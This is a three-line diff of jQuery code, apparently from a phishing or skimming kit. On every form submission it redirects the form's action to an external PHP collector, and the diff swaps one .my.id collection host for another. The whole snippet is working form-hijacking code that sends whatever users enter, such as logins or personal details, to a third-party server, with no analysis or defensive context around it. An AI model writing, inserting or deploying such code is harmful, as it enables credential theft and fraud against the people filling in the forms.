@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://jajanan-sultan.my.id/ciwok.php");
+  $(myform).attr("action", "https://anakcantix-papa.my.id/sultanan.php");
 });
